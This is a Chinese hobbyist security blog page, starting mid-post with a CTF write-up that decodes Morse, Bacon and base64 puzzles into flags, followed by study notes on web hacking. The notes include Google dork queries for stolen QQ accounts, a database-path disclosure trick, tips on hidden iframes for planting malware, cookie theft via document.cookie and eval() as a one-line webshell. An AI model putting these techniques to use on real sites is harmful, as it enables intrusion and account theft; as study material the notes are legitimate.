&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-</span><br></pre></td></tr></table></figure>
<p>使用在线摩根密码<a target="_blank" rel="noopener" href="http://moersima.00cha.net/%E8%A7%A3%E5%AF%86%E5%90%8E%EF%BC%8C%E5%BE%97%E5%88%B0">http://moersima.00cha.net/解密后，得到</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">may be have another decodehhhhaaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba</span><br></pre></td></tr></table></figure>
<p>abab的可能为培根密码，<a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/baconian.php">http://rumkin.com/tools/cipher/baconian.php</a></p>
<p>解密后得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACKANDDEFENCEWORLDISINTERESTING</span><br></pre></td></tr></table></figure>
<p>根据题目提示修改相应格式后提交flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;attackanddefenceworldisinteresting&#125;</span><br></pre></td></tr></table></figure>
<h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p>考察：ASCII码，base64编码</p>
<p><strong>第一步</strong></p>
<p>打开文件，发现以==结尾，为base64编码，解码后得到字符串</p>
<p><strong>第二步</strong></p>
<p>没小于128的，猜测是ASCII码，写个python转换一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &quot;76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119&quot;</span><br><span class="line">str &#x3D; str.split(&quot;;&amp;#&quot;);</span><br><span class="line">text &#x3D; &quot;&quot;</span><br><span class="line">for s in str:</span><br><span class="line">	text +&#x3D; chr(int(s))</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw</span><br></pre></td></tr></table></figure>
<p><strong>第三步</strong></p>
<p>将其进行base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">119&#x2F;101&#x2F;108&#x2F;99&#x2F;111&#x2F;109&#x2F;101&#x2F;116&#x2F;111&#x2F;97&#x2F;116&#x2F;116&#x2F;97&#x2F;99&#x2F;107&#x2F;97&#x2F;110&#x2F;100&#x2F;100&#x2F;101&#x2F;102&#x2F;101&#x2F;110&#x2F;99&#x2F;101&#x2F;119&#x2F;111&#x2F;114&#x2F;108&#x2F;100</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>最后一步</strong></p>
<p>将其转换为ascill码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcometoattackanddefenceworld</span><br></pre></td></tr></table></figure>
<p>添加格式，即为flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" data-id="ckkdrz0z70007ugus60u76cr9" data-title="CTF答案记录" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-基础课-精通黑客脚本笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/23/%E5%9F%BA%E7%A1%80%E8%AF%BE-%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2020-12-23T12:56:36.000Z" itemprop="datePublished">2020-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/23/%E5%9F%BA%E7%A1%80%E8%AF%BE-%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/">精通黑客脚本笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h1 id="第二章-常见脚本漏洞演练"><a href="#第二章-常见脚本漏洞演练" class="headerlink" title="第二章 常见脚本漏洞演练"></a>第二章 常见脚本漏洞演练</h1><h2 id="Google-Hack技术大演练"><a href="#Google-Hack技术大演练" class="headerlink" title="Google Hack技术大演练"></a>Google Hack技术大演练</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intitle:管理登录 filetype:php # 搜索存在敏感信息的网站</span><br><span class="line">payment site:fr # 法国的相关支付界面</span><br><span class="line">inurl:qq.txt # 搜索被盗的qq号</span><br><span class="line">site:baidu.com # 搜索子域名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="暴库漏洞攻击"><a href="#暴库漏洞攻击" class="headerlink" title="暴库漏洞攻击"></a>暴库漏洞攻击</h2><p>conn.asp是数据库连接文件，包含了被调用数据库的路径及数据库名</p>
<p>conn.asp暴库原理为，直接访问conn.asp时，相对路径出错</p>
<p>/改成%5c。%5c在16进制中为\。当IIS遇到\，IIS以为遇到了一个虚拟目录，便停止解析，从而报错</p>
<h1 id="第三章-HTML语言入门"><a href="#第三章-HTML语言入门" class="headerlink" title="第三章 HTML语言入门"></a>第三章 HTML语言入门</h1><h2 id="自定义头像跨站漏洞"><a href="#自定义头像跨站漏洞" class="headerlink" title="自定义头像跨站漏洞"></a>自定义头像跨站漏洞</h2><p>若写入跨站代码后，返回数据上出现字符，则存在跨站漏洞。只需要将HTML中标签闭合即可。</p>
<h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><p>隐藏域页面中不饿建，通常用来收集或发送信息</p>
<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><frameset>不能放在<body>或<head>标签中

<p>动态框架<iframe>可以实现在网页内部嵌入网页，但是其中的src属性也带来了挂马风险。挂马时，把该标签的高度、宽度、frameborder设置为0</p>
<h1 id="第四章-Javascript和Vbscript入门"><a href="#第四章-Javascript和Vbscript入门" class="headerlink" title="第四章 Javascript和Vbscript入门"></a>第四章 Javascript和Vbscript入门</h1><p>通过Javascript程序，可以控制web页面的外观，也能够检测用户数据的有效性，而这些操作都不需要和服务器进行交互，这样就减轻了服务器的处理数据负担。</p>
<p>事件是Javascript让页面活起来的驱动力，所有的Javascript都是对某个事件做出的操作和反应</p>
<h2 id="Javascript基础"><a href="#Javascript基础" class="headerlink" title="Javascript基础"></a>Javascript基础</h2><p>document.writeln()在添加<pre>标签后，才会有换行作用。</p>
<p>三种交互方法：alert()，confirm()，prompt()</p>
<p>变量区分大小写</p>
<p>BOM，browser object model，浏览器对象模型</p>
<p>通过Javascript内置对象navigator我么可以知道当前使用的浏览器是那种类型，那种版本，是否支持java，当前浏览器插件信息等</p>
<p>window对象在使用时，允许省略。如window.alert省略为alert</p>
<p>DOM，document object model，文档对象模型</p>
<p>document.cookie可以获取cookie，用于窃取cookie</p>
<h2 id="VBScript基础"><a href="#VBScript基础" class="headerlink" title="VBScript基础"></a>VBScript基础</h2><p>VBScript只有一种数据类型Variant</p>
<p>为了不影响程序运行效率和养成良好变成习惯，先声明变量再赋值。使用dim</p>
<h2 id="使用cookie"><a href="#使用cookie" class="headerlink" title="使用cookie"></a>使用cookie</h2><p>通过document.cookie进行设置并取用</p>
<p>HTTP Set-Cookie头的格式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:name&#x3D;value;[expires&#x3D;date];[path&#x3D;pathname];[domain&#x3D;domainname];[secure];</span><br><span class="line">方括号为可以省略的部分</span><br></pre></td></tr></table></figure>
<p>设置cookie的格式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;encodeURI(&quot;name&quot;)+&quot;&#x3D;&quot;+encodeURI(name)+&quot;;&quot;</span><br></pre></td></tr></table></figure>
<p>escape和encodeURI都可以用来对字符进行编码。escape将非字母字符转换为用字符和数字表示的等价字符串；encodeURI类似。</p>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="正则表达式对象方法"><a href="#正则表达式对象方法" class="headerlink" title="正则表达式对象方法"></a>正则表达式对象方法</h3><h4 id="test"><a href="#test" class="headerlink" title="test()"></a>test()</h4><p>lastIndex属性返回下一次字符串搜索开始的位置。若为全局搜索，返回最后一个匹配的字符串后面一个字符的位置</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>lastIndex属性返回前一次匹配字符串的第一个字符的位置</p>
<h3 id="正则表达式的字符串对象的方法"><a href="#正则表达式的字符串对象的方法" class="headerlink" title="正则表达式的字符串对象的方法"></a>正则表达式的字符串对象的方法</h3><p>match,</p>
<h2 id="跨站攻击"><a href="#跨站攻击" class="headerlink" title="跨站攻击"></a>跨站攻击</h2><p>UBB，Ultimate Bulletin Board，一种tag语法代码</p>
<p>① 过滤用户提交变量中的&lt;和&gt;，从而防止用户自行构造html标记</p>
<p>② 过滤其中的：代码，从而防止javascript和vbscript的执行</p>
<p>③ 过滤或转换空格字符</p>
<h1 id="第五章-数据库基础"><a href="#第五章-数据库基础" class="headerlink" title="第五章 数据库基础"></a>第五章 数据库基础</h1><h2 id="利用SQL进行数据查询"><a href="#利用SQL进行数据查询" class="headerlink" title="利用SQL进行数据查询"></a>利用SQL进行数据查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tablename (field type[(size)][NOT NULL]&#123;, field type [(size)][NOT NULL]&#125;[, PRIMARY KEY(field&#123;,field...&#125;)]);</span><br><span class="line">SELECT[ALL|DISTINCT]&#123;expr[[AS]c_alias&#123;,expr[[AS]c_alias]...&#125;&#125; from tableref&#123;,tableref...&#125; [where&lt;search_condition]</span><br><span class="line">SELECT DISTINCT id FROM hack</span><br><span class="line">SELECT id AS 标识, name AS 姓名, city AS 城市, age AS 年龄 FROM hack</span><br><span class="line">SELECT * FROM hack GROUP BY age</span><br><span class="line">SELECT * FROM hack WHERE city&#x3D;(SELECT city FROM hack WHERE id&#x3D;100)</span><br></pre></td></tr></table></figure>
<p>集合函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COUNT(column_name) 统计column_name列非空的元组数目</span><br><span class="line">SUM(column_name) 统计column_name列的值的和</span><br><span class="line">AVG(column_name)</span><br><span class="line">MAX(column_name)</span><br><span class="line">MIN(column_name)</span><br></pre></td></tr></table></figure>
<p>子查询结果是集合时，谓语关键词可以使用IN，ANY/ALL，EXISTS</p>
<h1 id="第六章-ASP基础"><a href="#第六章-ASP基础" class="headerlink" title="第六章 ASP基础"></a>第六章 ASP基础</h1><h2 id="ASP常用内置对象"><a href="#ASP常用内置对象" class="headerlink" title="ASP常用内置对象"></a>ASP常用内置对象</h2><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><p>用于得到用户提交的数据</p>
<p>用querystring获取GET，用form获取POST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myname&#x3D;request.querystring(&quot;name&quot;) #GET方式</span><br><span class="line">myname&#x3D;request.form(&quot;name&quot;) #POST方式</span><br></pre></td></tr></table></figure>
<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><p>将服务器数据发送到用户的浏览器上</p>
<p>write方法，将数据输出到客户端</p>
<p>redirect方法，重定向，需要设置Response对象的Buffer属性为真</p>
<p>Status属性，HTTP响应的状态码</p>
<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>扩展asp功能，可以利用符合COM接口的第三方组件</p>
<p>CreateObject()方法，利用符合COM接口的第三方组件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set myVar &#x3D; Server.CreateObject(&quot;ADODB.connection&quot;)</span><br></pre></td></tr></table></figure>
<p>HTMLEncode()方法，用于字符串编码，可防止跨站漏洞</p>
<p>URLEncode()方法，字符串以URL的编码输出</p>
<h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>存储特定用户会话所需的信息</p>
<h2 id="ASP组件"><a href="#ASP组件" class="headerlink" title="ASP组件"></a>ASP组件</h2><p>即ActiveX</p>
<h2 id="ADO"><a href="#ADO" class="headerlink" title="ADO"></a>ADO</h2><p>ActiveX Data Objects，ActiveX数据对象</p>
<h1 id="第九章-PHP基础"><a href="#第九章-PHP基础" class="headerlink" title="第九章 PHP基础"></a>第九章 PHP基础</h1><h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><p>一个PHP文件由五个部分组成：HTML、PHP标记、PHP语句、空格、注释</p>
<h3 id="PHP标记风格"><a href="#PHP标记风格" class="headerlink" title="PHP标记风格"></a>PHP标记风格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;内容&#39;; ?&gt;</span><br><span class="line">#XML风格</span><br><span class="line">&lt;? echo &#39;内容&#39;; ?&gt; </span><br><span class="line">#简短风格，需要在php.ini中启用short_open_tag，且是默认启用</span><br><span class="line">&lt;SCRIPT LANGUAGE&#x3D;&#39;php&#39;&gt;echo &#39;内容&#39;;&lt;&#x2F;SCRIPT&gt; </span><br><span class="line">#SCRIPT风格</span><br><span class="line">&lt;% echo &#39;内容&#39; %&gt; </span><br><span class="line"># ASP风格，需要启用asp_tags，默认不启用</span><br></pre></td></tr></table></figure>
<h3 id="访问表单变量"><a href="#访问表单变量" class="headerlink" title="访问表单变量"></a>访问表单变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$display # 需要开启register_globals，默认不开启</span><br><span class="line">$_POST[&#39;display&#39;] # 默认</span><br><span class="line">$HTTP_POST_VARS[&#39;display&#39;] # 弃用 </span><br></pre></td></tr></table></figure>
<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS、$_SERVER、$_GET、$_POST、$_COOKIE、$_FILES、$_ENV、$_REQUEST、$_SESSION</span><br></pre></td></tr></table></figure>
<h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">trim() # 去除空格</span><br><span class="line">addslshes() # 转移字符</span><br><span class="line">stripslashes() # 与addslshes功能相反</span><br><span class="line">php.ini中的magic_quotes_gpc配置指令 # 若为TRUE，则会实现addslshes和stripslashes</span><br></pre></td></tr></table></figure>
<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new mysqli(&#39;主机名&#39;，&#39;MYSQL用户名&#39;, &#39;MYSQL密码&#39;,&#39;需要访问的数据库&#39;)</span><br><span class="line">$db &#x3D; mysqli_connect(&#39;主机名&#39;，&#39;MYSQL用户名&#39;, &#39;MYSQL密码&#39;,&#39;需要访问的数据库&#39;)</span><br><span class="line"></span><br><span class="line">$result &#x3D; mysql_query(&quot;select * from hack&quot;)</span><br><span class="line">$result &#x3D; mysql_db_query(&quot;crack&quot;,&quot;select * from hack&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><h3 id="与文件系统和服务器交互"><a href="#与文件系统和服务器交互" class="headerlink" title="与文件系统和服务器交互"></a>与文件系统和服务器交互</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#上传</span><br><span class="line">在超级全局数组$_FILES中处理（需要register_global开启）</span><br><span class="line"></span><br><span class="line">#目录文件</span><br><span class="line">opendir()</span><br><span class="line">readdir()</span><br><span class="line">closedir()</span><br><span class="line">mkdir()</span><br><span class="line">basename(),dirname()</span><br><span class="line">rmdir()</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line"></span><br><span class="line">#程序执行函数</span><br><span class="line">exec(string command[,array &amp;result[,int &amp;result_value]]) # 只返回命令结果的最后一行，若以result传递变量，将获得返回字符串数组；若result_value传递变量，将获得返回代码</span><br><span class="line">passthru() #将结果直接输出并显示在浏览器</span><br><span class="line">system() #将结果直接输出并显示在浏览器</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="会话控制"><a href="#会话控制" class="headerlink" title="会话控制"></a>会话控制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie()</span><br><span class="line">session_get_cookie_params()</span><br></pre></td></tr></table></figure>
<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br></pre></td></tr></table></figure>
<h1 id="第十章-PHP程序常见问题"><a href="#第十章-PHP程序常见问题" class="headerlink" title="第十章 PHP程序常见问题"></a>第十章 PHP程序常见问题</h1><h2 id="PHP注射漏洞"><a href="#PHP注射漏洞" class="headerlink" title="PHP注射漏洞"></a>PHP注射漏洞</h2><p>intval() 将所有数据强制转换为数字</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/23/%E5%9F%BA%E7%A1%80%E8%AF%BE-%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/" data-id="ckmadesnt0008y0us5s9tepf3" data-title="精通黑客脚本笔记" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" rel="tag">基础课</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-hello-my-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/22/hello-my-blog/" class="article-date">
  <time class="dt-published" datetime="2020-12-22T08:02:53.000Z" itemprop="datePublished">2020-12-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/22/hello-my-blog/">hello my blog</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/22/hello-my-blog/" data-id="ckk1u3o4h0001tsus1mci359t" data-title="hello my blog" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" rel="tag">基础课</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">文学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" rel="tag">论文学习</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 13.33px;">dev</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" style="font-size: 16.67px;">基础课</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">文学</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">考证</a> <a href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" style="font-size: 16.67px;">论文学习</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/03/24/%E5%9F%BA%E7%A1%80%E8%AF%BE-%E6%B8%85%E5%8D%8EOS/">基础课-清华OS</a>
          </li>
        
          <li>
            <a href="/2021/03/16/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-%E6%96%B9%E6%B3%95%E8%AE%BA/">论文学习-方法论</a>
          </li>
        
          <li>
            <a href="/2021/03/15/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-2020-S-P-A-A-Stealthier-Partitioning-Attack-against-Bitcoin-Peer-to-Peer-Network/">论文学习-2020-S-P-A-A Stealthier Partitioning Attack against Bitcoin Peer-to-Peer Network</a>
          </li>
        
          <li>
            <a href="/2021/03/15/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-2020-S-P-A-Security-Analysis-of-the-Facebook-Ad-Library/">论文学习-2020-S-P-A Security Analysis of the Facebook Ad Library</a>
          </li>
        
          <li>
            <a href="/2021/03/13/CTF-wp-NahamCon2021/">CTF-wp-NahamCon2021</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>